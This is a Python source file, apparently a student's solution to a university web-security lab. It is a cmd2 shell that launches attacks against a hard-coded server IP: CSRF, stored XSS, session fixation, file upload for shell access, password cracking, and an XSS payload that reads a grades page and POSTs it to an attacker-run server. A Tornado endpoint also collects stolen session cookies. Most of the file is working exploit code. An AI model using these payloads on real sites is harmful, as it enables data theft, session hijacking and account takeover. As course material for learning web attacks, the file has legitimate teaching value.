from cmd2 import Cmd
import subprocess
import os
import string
import random
import threading
import tornado
import tornado.web
from threading import Thread
from bs4 import BeautifulSoup

IP = '35.186.175.202'
PASSWORD = 'strong-sunfish-from-mars'


def randomName():
    if not os.path.exists('./tmp'):
        os.makedirs('./tmp')
    name = './tmp/' + ''.join([random.choice(string.ascii_letters) for _
                           in range(10)])
    return name


class MainHandler(tornado.web.RequestHandler):
    def initialize(self, html):
        self.html = html

    def get(self):
        self.write(self.html)


class GradeHandler(tornado.web.RequestHandler):
    def initialize(self, appRef):
        self.appRef = appRef

    def get(self):
        self.write(self.appRef.getGradesTable())

    def post(self):
        gradeHtml = self.request.body
        soup = BeautifulSoup(gradeHtml, 'html.parser')
        self.appRef.setGradesTable(str(soup.find(id="gradesTable")))


class SessionStealHandler(tornado.web.RequestHandler):
    def initialize(self, appRef):
        self.appRef = appRef

    def post(self):
        cookie = self.get_argument('cookie')
        self.appRef.setCookie(cookie)


class WebServer(tornado.web.Application, Thread):
    def __init__(self, mainPageHtml, port):
        super(WebServer, self).__init__([
            (r"/", MainHandler, dict(html=mainPageHtml)),
            (r"/grades", GradeHandler, dict(appRef=self)),
            (r"/session_steal", SessionStealHandler, dict(appRef=self))
        ])
        self.port = port
        self.gradesTable = 'Not yet received'

    def run(self):
        self.listen(self.port)
        tornado.ioloop.IOLoop.current().start()

    def setGradesTable(self, table):
        self.gradesTable = table

    def getGradesTable(self):
        return self.gradesTable

    def setCookie(self, cookie):
        self.cookie = cookie

    def getCookie(self, cookie):
        return self.cookie


class FlagShell(Cmd):

    prompt = ">>> "

    def do_victim(self, arg):
        """Login as victim
        """
        subprocess.Popen(["firefox", "--new-tab", IP])

    def do_csrf(self, arg):
        """Cross-Site Request Forgery
        """
        new_about_me = arg
        with open('./csrf.html', 'r') as f:
            html = f.read()
            html = html.format(server_ip=IP, about_me=new_about_me)

        fname = randomName()
        with open(fname, 'w') as f:
            f.write(html)
            subprocess.Popen(['firefox', fname])

    def do_sxss(self, arg):
        """Stored Cross-Site Scripting
        """
        code = """<script>alert('You are XSS-ed!')</script>"""
        with open('./sxss.html', 'r') as f:
            html = f.read().format(server_ip=IP, comment="Innocent comment" + code)

        fname = randomName()
        with open(fname, 'w') as f:
            f.write(html)
            subprocess.Popen(['firefox', fname])

    def do_csda(self, arg):
        """Cross-Site Data Access
        """
        port = 8090
        code = """<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() {{
    console.log(xhr.response);
    var sender = new XMLHttpRequest();
    sender.open('POST', 'http://localhost:{port}/grades', true);
    sender.send(xhr.response);
}}
xhr.open('GET', '/list-grades.php', true);
xhr.send(null);
</script>
""".format(port=port)

        with open('./csda.html', 'r') as f:
            html = f.read()
            html = html.format(server_ip=IP, about_me="Innocent profile" + code)

        subprocess.Popen(['firefox', '--new-tab', 'http://localhost:8090'])
        ws = WebServer(html, port)

        def run():
            ws.run()

        t = threading.Thread(target=run)
        t.start()

    def do_sql_injection(self, arg):
        """SQL Injection
        """
        subprocess.Popen(["firefox", "/home/xttjsn/Dropbox/Brown/Course/1660/projects/flag/sql_injection.html"])

    def do_fileupload(self, arg):
        """Exploit file upload for shell access!
        """
        import hashlib
        handin_hash = hashlib.sha1(b"txiaotin_cryptography").hexdigest()
        with open('./fileupload.html', 'r') as f:
            html = f.read().format(server_ip=IP, handin_hash=handin_hash)

        fname = randomName()
        with open(fname, 'w') as f:
            f.write(html)
            subprocess.Popen(['firefox', fname])

    def do_session_fixation(self, arg):
        """Session fixation
        """
        cookie = arg
        code = """<script>
setInterval(function(){{ document.cookie=&#34;{}&#34;;}}, 500);
</script>""".format(cookie)

        with open('./session_fixation.html', 'r') as f:
            html = f.read().format(server_ip=IP, comment="Innocent comment" + code)

        fname = randomName()
        with open(fname, 'w') as f:
            f.write(html)
            subprocess.Popen(['firefox', fname])

    def do_badpassword(self, arg):
        """List bad password hashing
        """
        import hashlib
        handin_hash = hashlib.sha1(b"txiaotin_flag").hexdigest()
        with open('./badpassword.html', 'r') as f:
            html = f.read().format(server_ip=IP, handin_hash=handin_hash)

        fname = randomName()
        with open(fname, 'w') as f:
            f.write(html)
            subprocess.Popen(['firefox', fname])

    def do_crack(self, arg):
        """Crack bad password

        Use the following hashcat mode
        120 | rsha1($salt.$pass) | Raw Hash, Salted and/or Iterated
        """
        args = arg.split()
        if len(args) != 2:
            self.poutput("Usage: crack <hash> <dictionary>")
        else:
            p = subprocess.Popen(['./cracker/cracker', args[0], args[1]])

    def do_directaccess(self, arg):
        """Direct object access
        """
        with open('./directaccess.html', 'r') as f:
            html = f.read().format(IP=IP)

        fname = randomName()
        with open(fname, 'w') as f:
            f.write(html)
            subprocess.Popen(['firefox', fname])


if __name__ == '__main__':
    shell = FlagShell()
    shell.cmdloop()
